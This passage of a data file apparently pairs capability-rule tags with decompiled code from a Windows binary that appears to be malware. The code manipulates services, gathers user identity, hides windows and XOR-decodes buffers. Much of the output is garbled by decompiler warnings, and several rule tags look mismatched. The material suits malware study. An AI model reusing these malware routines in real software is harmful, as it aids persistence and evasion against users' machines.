NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00401fdb;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00401f87;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.004019b0(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00401ad0(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00401fa2;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2449
    },
    "004020f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402173) overlaps instruction at (ram,0x00402171)\n// \n\nuint __cdecl fcn.004020f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    int32_t aiStackY379 [11];\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    uStack288 = arg_8h;\n    uStack292 = 0x40211f;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = false;\n    bVar4 = true;\n    var_108h = 0;\n    puVar2 = &fcn.004020f0::var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    puStack296 = &stack0xfffffef4;\n    uStack292 = 0x104;\n    uStack300 = arg_8h;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        puVar2[-0x1c] = puVar2[-0x1c] - &stack0xfffffed4;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&stack0xfffffef4, 0x411534);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x402070, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 581
    },
    "00402740": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402740(char **arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004025c0(&var_68h, &var_4h);\n    fcn.00401280(&var_68h, var_4h, str.YzFUd3, 0xa160);\n    *arg_8h = str.YzFUd3;\n    *arg_ch = 0xa160;\n    return;\n}\n",
        "token_count": 238
    },
    "00402ab0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ab0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "00402e90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402eb8) overlaps instruction at (ram,0x00402eb6)\n// \n\nuint fcn.00402e90(void)\n\n{\n    int32_t iVar1;\n    char extraout_CH;\n    code *unaff_EBX;\n    code *pcVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411264);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        *(iVar1 + 0x60541e00) = *(iVar1 + 0x60541e00) + extraout_CH;\n        pcVar2 = unaff_EBX;\n    }\n    *0x42163c = (*pcVar2)(iVar1);\n    *0x421640 = (*pcVar2)(iVar1, 0x411290);\n    *0x421644 = (*pcVar2)(iVar1, 0x4112a0);\n    if (((*0x42163c != 0) && (*0x421640 != 0)) && (*0x421644 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 291
    },
    "00403d30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e8b) overlaps instruction at (ram,0x00403e88)\n// \n\nvoid __fastcall fcn.00403d30(uint param_1)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    ushort extraout_DX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    bool in_OF;\n    bool bVar5;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    \n    uVar2 = param_1 >> 8;\n    if ((in_OF) || (!in_OF)) {\n        param_1 = 0x20;\n        in_stack_ffffffec = 0x4114ec;\n        in_stack_ffffffe8 = 0x16;\n    }\n    *unaff_EDI = *unaff_ESI;\n    bVar3 = CARRY1(*0xec682080, uVar2);\n    bVar5 = SCARRY1(*0xec682080, uVar2);\n    *0xec682080 = *0xec682080 + uVar2;\n    bVar4 = *0xec682080 == '\\0';\n    fcn.00402d40(0x4115f4, in_stack_ffffffe8, in_stack_ffffffec, param_1);\n    if ((bVar5) || (!bVar5)) {\n        in_stack_ffffffdc = 0x41150c;\n        in_stack_ffffffd8 = 0x16;\n    }\n    else {\n        uVar1 = in(extraout_DX);\n        *(unaff_EDI + 1) = uVar1;\n        if (!bVar3 && !bVar4) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00402d40(0x4115f4, 0x56, in_stack_ffffffd8, in_stack_ffffffdc);\n    fcn.00402d40(0x4115f4, 0x16, 0x411534, 8);\n    fcn.00402d40(0x4115f4, 0x16, 0x41153c, 0x19);\n    fcn.00402d40(0x4115f4, 0x16, 0x411558, 0xb);\n    fcn.00402d40(0x4115f4, 0x16, 0x411564, 0x12);\n    fcn.00402d40(0x4115f4, 0x16, 0x411578, 0x12);\n    fcn.00402d40(0x4115f4, 0x16, 0x41158c, 2);\n    fcn.00402d40(0x4115f4, 0x16, 0x411590, 0x47);\n    fcn.00402d40(0x4115f4, 0x16, 0x411598, 8);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115a0, 6);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115a8, 7);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115b0, 7);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115b8, 6);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115c0, 0x25);\n    fcn.00402d40(0x4115f4, 0x16, 0x4115e8, 8);\n    return;\n}\n",
        "token_count": 909
    },
    "004040a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004040a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 182
    },
    "00404c40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404d3c) overlaps instruction at (ram,0x00404d39)\n// \n// WARNING: Removing unreachable block (ram,0x00404c66)\n// WARNING: Removing unreachable block (ram,0x00404cc5)\n// WARNING: Removing unreachable block (ram,0x00404cd4)\n\nuint64_t __cdecl fcn.00404c40(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint *in_ECX;\n    uint32_t in_EDX;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    uchar in_CF;\n    uchar in_PF;\n    bool bVar4;\n    char in_SF;\n    char in_OF;\n    uint64_t uVar5;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        in_SS = unaff_EDI;\n        *(unaff_EDI | &stack0xfffffffc) = in_EAX;\n        in_CF = false;\n        in_EDX = in_EDX & 0xffffff00;\n        uVar2 = in_EAX + (in_EAX >> 8) * 'y';\n        in_EAX = in_EAX & 0xffff0000 | uVar2;\n        in_PF = (POPCOUNT(uVar2) & 1U) == 0;\n    }\n    *arg_8h = 0x17;\n    uVar3 = in_EAX;\n    if ((!in_PF) && (in_PF)) {\n        puVar1 = segment(in_SS, *0x10 + -0x10);\n        uVar3 = *puVar1;\n        in_EDX = in_EAX;\n        if (!in_CF) {\n            if (in_PF) {\n                in(0x9ea5);\n                uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n                return uVar5;\n            }\n            uVar3 = uVar3;\n            in_EDX = 0xb7bc9ea5;\n        }\n    }\n    arg_8h[1] = 0x58;\n    arg_8h[2] = 0xd6;\n    arg_8h[3] = 10;\n    arg_8h[4] = 0x10;\n    arg_8h[5] = 0xb;\n    arg_8h[6] = 0x24;\n    bVar4 = (uVar3 & 0x11cb) == 0;\n    arg_8h[7] = 0x2e;\n    if ((bVar4) || (!bVar4)) {\n        in_ECX = arg_ch;\n    }\n    *in_ECX = 8;\n    return CONCAT44(in_EDX, arg_8h) | 0x5f;\n}\n",
        "token_count": 686
    },
    "00404d50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d50(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404c40(&var_68h, &var_4h);\n    fcn.00401280(&var_68h, var_4h, 0x41160c, 0x10000);\n    *arg_8h = 0x41160c;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 241
    },
    "00401280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040134c) overlaps instruction at (ram,0x0040134b)\n// \n// WARNING: Removing unreachable block (ram,0x0040134f)\n\nuint * __cdecl fcn.00401280(uint32_t arg_8h, uint32_t arg_ch, char *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    char *in_ECX;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint *unaff_EBX;\n    char *pcVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    \n    puVar6 = NULL;\n    puVar3 = arg_14h;\n    if (arg_14h != NULL) {\n        do {\n            puVar3 = ZEXT48(puVar6) % arg_ch;\n            uVar4 = *(puVar6 + arg_10h) ^ *(puVar3 + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar4;\n            if ((uVar4 == 0) || (uVar4 != 0)) {\n                *(puVar6 + arg_10h) = uVar4;\n                puVar3 = arg_14h;\n            }\n            else {\n                puVar7 = puVar6 + 1;\n                uVar1 = in(ZEXT48(puVar6) % arg_ch);\n                *puVar6 = uVar1;\n                if (&stack0xfffffff0 < 1) {\n                    pcVar5 = arg_10h;\n                    if (*0x10 == 0x11 || &stack0xfffffff0 < 1) goto code_r0x0040134e;\n                    do {\n                        pcVar5 = puVar3 + 1;\ncode_r0x0040134e:\n                        bVar8 = true;\n                        do {\n                            if (in_ECX == NULL) break;\n                            in_ECX = in_ECX + -1;\n                            bVar8 = *pcVar5 == *puVar7;\n                            pcVar5 = pcVar5 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (bVar8);\n                        if (bVar8) {\n                            return puVar3;\n                        }\n                        do {\n                            puVar3 = puVar3 + 1;\n                            if (unaff_EBX < puVar3) {\n                                return NULL;\n                            }\n                        } while (*puVar3 != *arg_10h);\n                        in_ECX = arg_14h + -1;\n                        puVar7 = arg_10h + 1;\n                    } while( true );\n                }\n                uVar2 = arg_8h ^ 0xdee0ed6d;\n                uVar4 = uVar2 + (uVar2 >> 8) * -0x31;\n                *(unaff_EBX + 0x1c881445) = *(unaff_EBX + 0x1c881445) ^ in_ECX;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                puVar3 = uVar2 & 0xffff0000 | CONCAT11(in_AF, uVar4 + in_AF * '\\x06') & 0xff0f;\n                puVar6 = puVar7;\n            }\n            puVar6 = puVar6 + 1;\n        } while (puVar6 < puVar3);\n    }\n    return puVar3;\n}\n",
        "token_count": 786
    },
    "004012f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040132c) overlaps instruction at (ram,0x0040132b)\n// \n\nuint * __cdecl fcn.004012f0(uint *arg_8h, int32_t arg_ch, char *noname_2, uint *arg_14h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t unaff_ESI;\n    uint *puVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    bVar6 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    puVar3 = (arg_8h - arg_14h) + arg_ch;\n    if (((bVar6 == puVar3 < 0) && (bVar6 != puVar3 < 0)) || (arg_14h != NULL)) {\n        puVar1 = arg_14h + 1;\n        *arg_14h = *arg_8h;\n        puVar2 = 0xd08bc33b;\n        if ((unaff_ESI | 0x51) < puVar3 || (unaff_ESI | 0x51) == 0xffffffff) {\n            do {\n                if (*puVar2 == *noname_2) {\n                    bVar6 = true;\n                    pcVar5 = noname_2;\n                    puVar4 = puVar2;\n                    do {\n                        puVar4 = puVar4 + 1;\n                        puVar1 = puVar1 + -1;\n                        pcVar5 = pcVar5 + 1;\n                        if (puVar1 == NULL) break;\n                        bVar6 = *puVar4 == *pcVar5;\n                    } while (bVar6);\n                    puVar1 = arg_14h;\n                    if (bVar6) {\n                        return puVar2;\n                    }\n                }\n                puVar2 = puVar2 + 1;\n            } while (puVar2 <= puVar3);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 461
    },
    "004016a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016d4) overlaps instruction at (ram,0x004016d0)\n// \n\nvoid __cdecl fcn.004016a0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t extraout_CL;\n    int32_t *piVar4;\n    uint8_t *unaff_EDI;\n    uint8_t uVar5;\n    uint8_t in_AF;\n    char cVar6;\n    char cVar7;\n    unkbyte10 extraout_ST0;\n    ulong uVar8;\n    \n    if (arg_ch != 1) goto code_r0x00401720;\n    uVar5 = 0;\n    cVar7 = '\\0';\n    cVar6 = '\\0';\n    uVar8 = fcn.00403390();\n    piVar4 = uVar8 >> 0x20;\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        *(uVar8 + -0x7ce92414) = extraout_ST0;\n        uVar2 = uVar8 - 1;\n        uVar1 = uVar2;\n        in_AF = 9 < (uVar1 & 0xf) | in_AF;\n        uVar1 = uVar1 + in_AF * '\\x06';\n        uVar1 = uVar1 + (0x90 < (uVar1 & 0xf0) | uVar5 | in_AF * (0xf9 < uVar1)) * '`';\n        puVar3 = uVar2 & 0xffffff00 | uVar1;\n        *piVar4 = *piVar4 + -0x5817207c;\n        *puVar3 = *puVar3 + uVar1;\n        uVar5 = *unaff_EDI;\n        *unaff_EDI = *unaff_EDI + extraout_CL;\n        *puVar3 = *puVar3 - CARRY1(uVar5, extraout_CL);\n        uVar5 = CARRY1(*puVar3, uVar1);\n        *puVar3 = *puVar3 + uVar1;\ncode_r0x004016df:\n        if (uVar5) {\n            out(0xbd, puVar3);\n            return;\n        }\n    }\n    else {\n        puVar3 = fcn.00401780();\n        if (!uVar5) goto code_r0x004016df;\n    }\n    fcn.00402200();\n    if (*0x421618 == 0) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        fcn.00404220();\n    }\ncode_r0x00401720:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 659
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401740(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403190(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "004019b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004019b0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ca0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00402d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402d8e) overlaps instruction at (ram,0x00402d89)\n// \n\nvoid __cdecl fcn.00402d40(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int16_t unaff_BX;\n    int32_t iVar5;\n    uint16_t uVar6;\n    int32_t unaff_EDI;\n    bool bVar7;\n    bool bVar8;\n    \n    iVar5 = 0;\n    iVar2 = arg_14h;\n    if (0 < arg_14h) {\n        do {\n            uVar6 = (unaff_EDI | 0x2fff) - unaff_BX ^ 0x7174;\n            if ((0 < uVar6) && (uVar6 < 1)) {\n                *(iVar2 + -0x74c625aa) = *(iVar2 + -0x74c625aa) ^ *(iVar5 + arg_10h);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar3 = iVar5 % arg_ch;\n            bVar7 = arg_8h + -0x6e32 < 0;\n            pcVar4 = (uVar3 >> 8 & 0xffff00) << 8 | uVar3 & 0xffff;\n            if ((bVar7) || (!bVar7)) {\n                *(iVar5 + arg_10h) = arg_14h ^ *(iVar5 + arg_10h) ^ *(uVar3 + arg_8h);\n                iVar5 = iVar5 + 1;\n                bVar8 = SBORROW4(iVar5, arg_14h);\n                bVar7 = iVar5 - arg_14h < 0;\n                iVar2 = arg_14h;\n            }\n            else {\n                *pcVar4 = *pcVar4 << 1;\n                bVar7 = *pcVar4 < '\\0';\n                puVar1 = arg_8h + -0x3aa57c61;\n                *puVar1 = *puVar1 >> 1 | ((*puVar1 & 1) != 0) << 0x1f;\n                bVar8 = ((*puVar1 & 0x40000000) != 0) != *puVar1 < 0;\n                LOCK();\n                iVar2 = arg_8h + -0x75ebba75;\n            }\n            unaff_EDI = arg_10h;\n        } while (bVar8 != bVar7);\n    }\n    return;\n}\n",
        "token_count": 624
    },
    "004030d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004030d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00403130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040316a) overlaps instruction at (ram,0x00403168)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403130(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t hSCManager;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t unaff_EDI;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    uVar3 = 0;\n    bVar4 = (unaff_EDI & in_EAX) < 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar4) || (iVar1 = hSCManager,  !bVar4)) {\n        iVar1 = arg_8h;\n    }\n    uVar2 = fcn.00402ca0(hSCManager, iVar1 + 0x8458b2f + uVar3);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 264
    },
    "00403320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403371) overlaps instruction at (ram,0x00403368)\n// \n// WARNING: Removing unreachable block (ram,0x00403362)\n\nuint __cdecl fcn.00403320(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4115f0, 0x421648, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 182
    },
    "00404070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00404070(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00404180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041d3) overlaps instruction at (ram,0x004041ce)\n// \n\nuint fcn.00404180(uint *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t unaff_EBX;\n    bool bVar4;\n    uint *puVar5;\n    uint *puVar6;\n    \n    puVar2 = param_1;\n    puVar5 = &param_1;\n    puVar3 = fcn.00402b30(param_1, param_2, puVar5, &param_2);\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar5 = puVar5 & 0xffff | unaff_EBX << 0x10;\n    bVar4 = (POPCOUNT(unaff_EBX >> 8) & 1U) != 0;\n    puVar3[0x16] = param_2;\n    if (bVar4) {\n        puVar6 = puVar2;\n        if (!bVar4) goto code_r0x004041c6;\n    }\n    puVar3 = &param_2;\n    puVar5 = &param_1;\n    puVar6 = puVar3;\ncode_r0x004041c6:\n    puVar1 = (param_2 + 1U | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | puVar3;\n    fcn.00402b30(puVar2, 0x34a96cf4, puVar5, puVar6);\n    return 1;\n}\n",
        "token_count": 383
    },
    "00404600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
